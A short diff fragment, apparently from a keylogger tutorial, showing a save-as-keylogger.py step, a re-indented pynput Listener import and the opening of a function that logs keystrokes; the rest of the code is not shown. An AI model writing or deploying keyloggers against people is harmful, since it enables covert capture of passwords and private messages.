@@ -5,7 +5,7 @@
 
 3.save file in notepad by keylogger.py
 
-from pynput.keyboard import Listener
+            from pynput.keyboard import Listener
             def log_keystroke(key):
                 key=str(key).replace('"',"")# Remove quotes
                 if key =="Key.space":
